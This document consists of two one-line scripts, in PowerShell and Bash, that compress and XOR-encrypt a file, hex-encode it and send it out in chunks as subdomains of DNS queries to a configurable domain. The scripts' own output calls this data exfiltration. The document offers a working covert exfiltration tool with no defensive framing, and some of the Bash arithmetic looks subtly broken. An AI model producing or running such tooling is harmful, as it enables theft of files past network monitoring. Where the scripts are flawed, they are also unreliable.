
## PowerShell

```powershell
$FilePath = "C:\path\to\your\file"; $Domain = "example.com"; $DnsServerIp = "8.8.8.8"; $Password = "securepass"; $UseTcp = $false; function XOR-Encrypt { param ([byte[]]$data, [byte[]]$password); $encryptedData = New-Object byte[] $data.Length; for ($i = 0; $i -lt $data.Length; $i++) { $encryptedData[$i] = $data[$i] -bxor $password[$i % $password.Length] }; return $encryptedData }; $data = [System.IO.File]::ReadAllBytes($FilePath); $filename = Split-Path -Leaf $FilePath; $filenameBytes = [System.Text.Encoding]::UTF8.GetBytes($filename); $timestamp = Get-Date -Format "yyyyMMddHHmmss"; $compressedStream = New-Object System.IO.MemoryStream; $gzipStream = New-Object System.IO.Compression.GZipStream $compressedStream, ([IO.Compression.CompressionMode]::Compress); $gzipStream.Write($data, 0, $data.Length); $gzipStream.Close(); $compressedData = $compressedStream.ToArray(); Write-Host "[*] Encrypting file, please wait..."; $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($Password); $encryptedData = XOR-Encrypt -data $compressedData -password $passwordBytes; $hexencryptedData = -join ($encryptedData | ForEach-Object { "{0:X2}" -f $_ }); $labelMaxSize = 63; $requestMaxSize = 255; $domainNameLength = $Domain.Length + 3; $metadataLength = "$filename|$timestamp".Length * 2; $bytesLeft = $requestMaxSize - $metadataLength - $domainNameLength; $nbChunks = [math]::Ceiling($hexencryptedData.Length / $bytesLeft); Write-Host "[+] Maximum data exfiltrated per DNS request (chunk max size): [$bytesLeft] bytes"; Write-Host "[+] Number of chunks: [$nbChunks]"; $chunk_id = 0; $start_index = 0; Write-Host "[*] Sending file, please wait..."; while ($chunk_id -lt $nbChunks) { $end_index = [Math]::Min($start_index + $bytesLeft, $hexencryptedData.Length); $chunk = $hexencryptedData.Substring($start_index, $end_index - $start_index); $chunkLength = [Math]::Ceiling($chunk.Length / 4); $chunks = @(); for ($i = 0; $i -lt 4; $i++) { $startIndex = $i * $chunkLength; $length = [Math]::Min($chunkLength, $chunk.Length - $startIndex); $chunks += $chunk.Substring($startIndex, $length) }; $encryptedFilename = XOR-Encrypt -data $filenameBytes -password $passwordBytes; $hex_filename = -join ($encryptedFilename | ForEach-Object { "{0:X2}" -f [byte][char]$_ }); $metadata = "$hex_filename|$timestamp|$nbChunks"; $subdomain = "$chunk_id.$($chunks[0]).$($chunks[1]).$($chunks[2]).$($chunks[3]).$metadata.$Domain."; $queryType = if ($UseTcp) { "-vc" } else { "" }; $max_retries = 5; $retry_count = 0; $success = $false; while ($retry_count -lt $max_retries -and -not $success) { $output = nslookup $queryType -type=a $subdomain $DnsServerIp 2>&1; if (-not $output.Contains("DNS request timed out.")) { $success = $true } else { $retry_count++; Write-Host "[*] Timeout occurred, retrying $retry_count/$max_retries..."; Start-Sleep -Seconds 3 } }; if (-not $success) { Write-Host "[!] Failed to send DNS query after multiple retries."; exit 1 }; Write-Progress -Activity "Sending file in Progress" -Status "$chunk_id/$nbChunks chunks Complete:" -PercentComplete '100'; $chunk_id++; $start_index = $end_index }; Write-Host "[+] Transfer complete!"
```

## Bash

```bash
FilePath="/path/to/your/file"; Password="securepass"; Domain="example.com"; DnsServerIp="8.8.8.8"; UseTcp=false; filename=$(basename "$FilePath"); timestamp=$(date +"%Y%m%d%H%M%S"); echo "[*] Encrypting file, please wait..."; encrypted_data=$(gzip -c "$FilePath" | xortool-xor -n -s "$Password" -f - | hexdump -v -e '/1 "%02x"'); label_max_size=63; request_max_size=235; domain_name_length=${#Domain}+3; metadata_length=$(((${#filename} + ${#timestamp}) * 2)); bytes_left=$((request_max_size - metadata_length - domain_name_length)); nb_chunks=$(((${#encrypted_data} + bytes_left - 1) / bytes_left)); echo "[+] Maximum data exfiltrated per DNS request (chunk max size): [$bytes_left] bytes"; echo "[+] Number of chunks: [$nb_chunks]"; chunk_id=0; start_index=0; echo "[*] Sending file, please wait..."; while [[ $chunk_id -lt $nb_chunks ]]; do end_index=$((start_index + bytes_left)); chunk=${encrypted_data:$start_index:bytes_left}; chunk_length=$(((${#chunk} + 3) / 4)); chunks=(); for ((i = 0; i < 4; i++)); do chunks[$i]=${chunk:$((i * chunk_length)):chunk_length}; done; encrypted_filename=$(echo -n "$filename" | xortool-xor -n -s "$Password" -f - | xxd -p); metadata="$encrypted_filename|$timestamp|$nb_chunks"; subdomain="$chunk_id.${chunks[0]}.${chunks[1]}.${chunks[2]}.${chunks[3]}.$metadata.$Domain"; max_retries=5; retry_count=0; success=false; while [[ $retry_count -lt $max_retries && $success == false ]]; do if [[ "$UseTcp" = true ]]; then dig_output=$(dig +tcp +short "$subdomain" @"$DnsServerIp" 2>&1); else dig_output=$(dig +short "$subdomain" @"$DnsServerIp" 2>&1); fi; if [[ ! "$dig_output" == *"connection refused"* ]]; then success=true; else retry_count=$((retry_count + 1)); echo "[*] Timeout occurred, retrying $retry_count/$max_retries..."; sleep 3; fi; done; if [[ $success == false ]]; then echo "[!] Failed to send DNS query after multiple retries."; exit 1; fi; printf "%4d%%\r" $((100 * chunk_id / nb_chunks)); chunk_id=$((chunk_id + 1)); start_index=$end_index; done; echo "[+] Transfer complete!"
```